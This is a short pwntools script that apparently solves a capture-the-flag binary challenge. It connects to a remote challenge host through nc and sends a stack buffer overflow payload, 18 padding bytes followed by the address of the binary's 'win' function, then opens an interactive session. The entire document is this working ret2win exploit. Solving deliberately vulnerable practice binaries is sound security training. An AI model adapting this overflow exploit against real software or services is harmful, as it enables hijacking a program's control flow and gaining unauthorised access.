from pwn import *

p = process(['nc', '34.170.146.252', '59419'])
elf = ELF('./chall')

win_addr = elf.symbols['win']

# payload = b'A'*18 + (0x401186).to_bytes(8, 'little')
payload = b'A'*18 + p64(win_addr)

p.recvuntil(b'input:')
p.sendline(payload+b'\n')
p.interactive()